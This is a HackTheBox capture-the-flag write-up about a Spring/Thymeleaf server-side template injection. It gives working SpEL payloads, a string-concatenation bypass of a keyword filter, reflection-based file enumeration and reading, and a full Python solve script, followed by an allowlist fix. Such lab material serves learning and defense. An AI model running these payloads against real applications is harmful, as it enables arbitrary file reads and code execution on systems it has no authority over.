---
title: "Breathtaking View"
date: 2027-06-05 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, spring, thymeleaf, spel, code-injection, filter-bypass]
description: "An Easy Web challenge — a Spring MVC controller returns a user-controlled locale parameter as the Thymeleaf view name. Thymeleaf's __${SpEL}__ preprocessing syntax evaluates arbitrary Spring Expression Language, leaking results in the template-not-found error. A string-concat filter bypass and a two-request FileInputStream session bridge exfiltrate the flag."
---

## Overview

Breathtaking View is an Easy Web challenge built on Spring Boot 2.2 and Thymeleaf. A locale
`GET` parameter is returned verbatim as the view name by a Spring MVC controller, and
Thymeleaf preprocesses any `__${SpEL}__` sequence it finds there — turning the error message
into an oracle. The controller blocks the literal string `"java"`, but
[Spring Expression Language (SpEL)](https://cwe.mitre.org/data/definitions/94.html)
evaluates `"ja"+"va"` at runtime, so the filter never fires. Because Thymeleaf rejects
non-`String`-returning expressions in view names, a two-request session bridge using
`FileInputStream` and Spring's `StreamUtils.copyToString` is needed to read the flag.

## The technique

[Code injection](https://cwe.mitre.org/data/definitions/94.html) via Thymeleaf's view-name
preprocessing is the root bug. A Spring MVC controller that returns a user-controlled value
as the view name allows the attacker to embed `__${SpEL}__` — Thymeleaf evaluates the
enclosed expression before looking up the template file, and when no template matches the
result the full expression output lands in the 500-error JSON body:

```
Error resolving template [<expression-result>]
```

Because the result leaks in the error, no output sink is needed — the response IS the oracle.

## Solution

### Step 1 — Register and log in

The challenge app requires a user session for the main page. Register an account and log in:

```bash
TARGET="http://<host>:<port>"
curl -s -c /tmp/cj -X POST "$TARGET/register" -d 'username=pwner&password=pwner'
curl -s -c /tmp/cj -b /tmp/cj -X POST "$TARGET/login"  -d 'username=pwner&password=pwner'
```

### Step 2 — Confirm SSTI

Send `__${7*7}__::x` as the `lang` parameter. The `::x` suffix is the Thymeleaf template
fragment selector — it tells the engine to parse what precedes it as a template expression,
which triggers preprocessing:

```bash
curl -sb /tmp/cj "$TARGET/?lang=__\${7*7}__::x"
```

Response contains `Error resolving template [49]` — the `7*7` expression was evaluated,
confirming SpEL preprocessing is active.

### Step 3 — Bypass the "java" keyword filter

The controller checks `lang.toLowerCase().contains("java")` and redirects on a match.
SpEL string concatenation resolves at evaluation time, so the parameter value never contains
the forbidden substring:

```
"ja"+"va"   ─SpEL→   "java"
```

Every class reference below uses this technique:
`"".getClass().forName("ja"+"va.io.FileInputStream")` bypasses the filter while loading
`java.io.FileInputStream` at runtime.

### Step 4 — Enumerate the flag filename

The flag is placed at a randomized path (`/flag_<12 random chars>_.txt`) at container build
time. Enumerate the root directory index-by-index to find it:

```bash
P='"".getClass().forName("ja"+"va.io.File").getConstructor("".getClass()).newInstance("/").listFiles()[0].getName()'
curl -sb /tmp/cj "$TARGET/" --data-urlencode "lang=__\${${P}}__::x"
```

Increment `[0]` → `[1]` → `[2]` … until the error body contains `flag_`. Run `listFiles().length` first to bound the loop.

### Step 5 — Read the flag (two-request session bridge)

Expressions that call `exec()` and return a `Process` or `InputStream` trigger
"Invalid template name specification" — Thymeleaf's template-name parser rejects any
expression that doesn't return a `String`. The workaround stores the file handle in the HTTP
session across two requests, then reads it via a Spring utility whose return type *is*
`String`:

**Request 1:** Open the file and store the `FileInputStream` in the session:

```
GET /?lang=__${#session.setAttribute("fis","".getClass().forName("ja"+"va.io.FileInputStream").getConstructor("".getClass()).newInstance("/flag_XXXX_.txt"))==null?"ok":"ok"}__::x
```

**Request 2:** Invoke `StreamUtils.copyToString` — the file content becomes the (invalid)
template name and leaks in the error:

```
GET /?lang=__${"".getClass().forName("org.springframework.util.StreamUtils").getMethod("copyToString","".getClass().forName("ja"+"va.io.InputStream"),"".getClass().forName("ja"+"va.nio.charset.Charset")).invoke(null,#session.getAttribute("fis"),"".getClass().forName("ja"+"va.nio.charset.Charset").getMethod("forName","".getClass()).invoke(null,"UTF-8"))}__::x
```

Response: `Error resolving template [HTB{...}]`

### Full automated solve

```python
#!/usr/bin/env python3
import sys, re, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:8081"
BASE   = f"http://{TARGET}"
s      = requests.Session()

s.post(f"{BASE}/register", data={"username": "pwner", "password": "pwner"})
s.post(f"{BASE}/login",    data={"username": "pwner", "password": "pwner"})

def ssti(expr):
    r = s.get(f"{BASE}/", params={"lang": f"__${{{expr}}}__::x"})
    m = re.search(r"Error resolving template \[([^\]]+)\]", r.json().get("message", ""))
    return m.group(1) if m else None

CHARSET = (
    '"".getClass().forName("ja"+"va.nio.charset.Charset")'
    '.getMethod("forName","".getClass()).invoke(null,"UTF-8")'
)
STREAM = (
    '"".getClass().forName("org.springframework.util.StreamUtils")'
    '.getMethod("copyToString",'
        '"".getClass().forName("ja"+"va.io.InputStream"),'
        '"".getClass().forName("ja"+"va.nio.charset.Charset")'
    f').invoke(null,#session.getAttribute("fis"),{CHARSET})'
)

FILES = (
    '"".getClass().forName("ja"+"va.io.File")'
    '.getConstructor("".getClass()).newInstance("/")'
    '.listFiles()'
)

n = int(ssti(f"{FILES}.length"))
flag_path = next(
    "/" + ssti(f"{FILES}[{i}].getName()")
    for i in range(n)
    if (ssti(f"{FILES}[{i}].getName()") or "").startswith("flag_")
)

ssti(
    f'#session.setAttribute("fis","".getClass().forName("ja"+"va.io.FileInputStream")'
    f'.getConstructor("".getClass()).newInstance("{flag_path}")'
    f')==null?"ok":"ok"'
)
print(ssti(STREAM))
```

## Why it worked

Thymeleaf's preprocessing feature (`__${...}__`) was designed for composing expressions in
internationalization templates. When a Spring MVC controller returns a raw user-controlled
string as the view name, that preprocessing step fires on attacker input before any template
file lookup — so arbitrary SpEL evaluates unconditionally.

The `"java"` filter was bypassable because it compared against the literal parameter value,
not the SpEL-evaluated result. String concatenation `"ja"+"va"` is invisible to the filter
but resolves to `"java"` inside the SpEL engine.

The two-request session bridge worked because `StreamUtils.copyToString` returns a plain
`String` (valid as a template name), while `Process.getInputStream()` and similar
`InputStream`-returning reflections do not — and Thymeleaf's template-name validator rejects
the non-String path before the expression result can leak.

## Fix / defense

The correct fix is to never return user input as a view name. Use an allowlist of valid
locale identifiers:

```java
private static final Set<String> VALID_LOCALES = Set.of("en", "fr", "de");

@GetMapping("/")
public String index(@RequestParam(defaultValue = "en") String lang) {
    if (!VALID_LOCALES.contains(lang)) lang = "en";
    return lang + "/index";
}
```

Additionally, upgrading to Thymeleaf 3.0.12+ disables view-name preprocessing in Spring MVC
contexts by default, removing the `__${...}__` attack surface entirely.
